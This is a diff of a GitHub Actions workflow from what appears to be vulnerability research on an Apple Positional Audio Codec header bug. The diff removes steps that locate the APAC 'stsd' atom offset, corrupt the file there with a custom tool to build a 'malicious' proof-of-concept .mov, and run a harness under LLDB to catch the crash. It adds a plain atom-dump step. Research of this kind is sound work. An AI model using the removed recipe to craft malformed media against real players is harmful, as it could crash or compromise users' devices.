@@ -129,66 +129,24 @@ jobs:
           swiftc harness.swift -o harness
           if [ $? -ne 0 ]; then echo "Swift compilation failed."; exit 1; fi
 
-      # This step now uses professional tools to find the offset and corrupt the file.
-      - name: Surgically Corrupt APAC File
+      # This step now focuses on generating the JSON dump for manual analysis.
+      - name: Generate Atom Dump for Manual Analysis
+        id: generate_dump
         working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
         run: |
           set -x 
           
-          echo "Installing Bento4 and jq to find the correct atom offset..."
-          brew install bento4 jq
-
-          cp IMG_1027.mov output_apac_poc.mp4
+          echo "Installing Bento4 to generate an atom dump..."
+          brew install bento4
           
-          mp4dump --format json output_apac_poc.mp4 > atom_dump.json
-          
-          OFFSET=$(jq -r '.. | objects | select(.name? == "stsd" and any(.children[]; .name? == "apac")) | .file_offset' atom_dump.json)
+          mp4dump --format json IMG_1027.mov > atom_dump.json
 
-          if [ -z "$OFFSET" ] || [ "$OFFSET" == "null" ]; then
-            echo "Could not find audio 'stsd' offset using jq. Using fallback."
-            OFFSET=3461 # Fallback offset from manual analysis
-          fi
+          echo "Atom dump generated. Please download the 'debug-and-poc-artifacts' artifact to analyze 'atom_dump.json' manually."
           
-          echo "Found APAC 'stsd' atom at offset ${OFFSET}"
-          
-          CORRUPTION_OFFSET=$(( ${OFFSET} + 72 ))
-          
-          echo "Calculated corruption offset: ${CORRUPTION_OFFSET}"
-
-          ./encodeme_corruptor output_apac_poc.mp4 $CORRUPTION_OFFSET
-          
-          echo "Malicious APAC PoC file generated."
-          ls -l output_apac_poc.mp4
-          
-      # Updated: This step now uses our custom Swift harness under the debugger.
-      - name: Launch Custom Player Under LLDB to Catch Crash
-        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
-        run: |
-          PLAYER_LOG_FILE="player_debug_log.txt"
-          echo "--- Debugging Custom Swift Player with final PoC ---" > $PLAYER_LOG_FILE
-          echo "Timestamp: $(date)" >> $PLAYER_LOG_FILE
-
-          echo "Creating LLDB script to launch and monitor the harness..."
-          cat > player_debug_script.lldb << 'EOF'
-          run
-          bt
-          quit
-          EOF
-
-          echo "Launching custom harness under LLDB..." >> $PLAYER_LOG_FILE
-          lldb -s player_debug_script.lldb -- ./harness output_apac_poc.mp4 >> $PLAYER_LOG_FILE 2>&1 || true
-
-          echo "✅ Player debug log created. Displaying contents:"
-          cat $PLAYER_LOG_FILE
-
-      # Upload all artifacts
-      - name: Upload All Artifacts
+      # Upload just the atom dump for analysis
+      - name: Upload Atom Dump
         uses: actions/upload-artifact@v4
         with:
-          name: debug-and-poc-artifacts
-          path: |
-            AppleTest2/apple-positional-audio-codec-invalid-header-main/output_apac_poc.mp4
-            AppleTest2/apple-positional-audio-codec-invalid-header-main/player_debug_log.txt
-            AppleTest2/apple-positional-audio-codec-invalid-header-main/atom_dump.json
+          name: debug-artifacts
+          path: AppleTest2/apple-positional-audio-codec-invalid-header-main/atom_dump.json
           retention-days: 7
-          if-no-files-found: error
